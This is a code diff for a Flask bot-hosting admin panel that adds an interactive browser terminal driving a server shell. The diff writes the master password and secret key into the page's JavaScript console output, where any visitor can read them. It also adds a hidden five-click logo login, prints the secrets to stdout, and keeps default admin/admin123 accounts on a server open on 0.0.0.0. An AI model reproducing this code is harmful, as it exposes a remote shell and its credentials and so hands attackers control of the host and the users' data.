+                        const data = await res.json();
+                        if (data.output) {
+                            terminalOutput.innerHTML += `<span class="output">${escapeHtml(data.output)}</span>`;
+                            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                        }
+                        isTerminalRunning = data.running;
+                        termStopBtn.disabled = !isTerminalRunning;
+                    } catch (e) {
+                        // ignore
+                    }
+                }, 500);
+            }
+
+            async function sendTerminalData(data) {
+                try {
+                    await fetch('/api/terminal/send', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ data: data, password: TERM_PASSWORD })
+                    });
+                } catch (e) {
+                    console.error('Failed to send terminal input:', e);
+                }
+            }
+
+            async function stopTerminal() {
+                try {
+                    await fetch('/api/terminal/stop', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ password: TERM_PASSWORD })
+                    });
+                    terminalOutput.innerHTML += `<span class="prompt">[Terminal stopped]</span><br />`;
+                    isTerminalRunning = false;
+                    termStopBtn.disabled = true;
+                    setTimeout(() => {
+                        startTerminalPolling();
+                    }, 500);
+                } catch (e) {
+                    console.error('Failed to stop terminal:', e);
+                }
             }
 
             function clearTerminal() {
                 terminalOutput.innerHTML = '<span class="prompt">$ </span>Terminal cleared.<br />';
             }
 
-            termRunBtn.addEventListener('click', runTerminalCommand);
+            termRunBtn.addEventListener('click', function() {
+                const data = terminalCommand.value;
+                if (!data) return;
+                if (!isTerminalRunning) {
+                    // try to start
+                }
+                sendTerminalData(data);
+                terminalCommand.value = '';
+            });
+
+            termStopBtn.addEventListener('click', stopTerminal);
             termClearBtn.addEventListener('click', clearTerminal);
+
             terminalCommand.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter') {
                     e.preventDefault();
-                    runTerminalCommand();
+                    termRunBtn.click();
                 }
             });
 
@@ -3399,9 +3758,12 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             console.log('🔐 YUVICODEX System ready.');
             console.log('📋 Default accounts: admin/admin123 (admin), user1/pass123, user2/pass456');
             console.log('💻 Use upload to deploy bots.');
+            console.log('🔑 Master Password: {{ MASTER_PASSWORD if MASTER_PASSWORD else "not set" }}');
+            console.log('🔐 Secret Key: {{ SECRET_KEY if SECRET_KEY else "not set" }}');
+            console.log('👉 Click logo 5 times for secret key login.');
+            console.log('📡 Interactive terminal started.');
         })();
     </script>
-
 </body>
 </html>
 """
@@ -3417,9 +3779,14 @@ if __name__ == '__main__':
     os.makedirs(REQUIREMENTS_DIR, exist_ok=True)
 
     print("="*60)
-    print("🐍 YUVICODEX Admin Panel (Updated: No Prefix, Per-Project Folders)")
+    print("🐍 YUVICODEX Admin Panel (Interactive Terminal)")
     print(f"🌐 Website Port: {port}")
     print("📁 Projects stored in uploads/<username>/<project_id>/")
     print("🌐 Static files served at /project/<username>/<project_id>/<filename>")
+    print(f"🔑 Master Password: {MASTER_PASSWORD}")
+    print(f"🔐 Secret Key: {SECRET_KEY}")
+    print("👉 Login with master password or click logo 5 times for secret key.")
+    print("📡 Terminal: interactive, supports stdin (e.g., pip uninstall prompts).")
+    print("⏹️ Stop button kills the shell process.")
     print("="*60)
     app.run(host='0.0.0.0', port=port, debug=False)
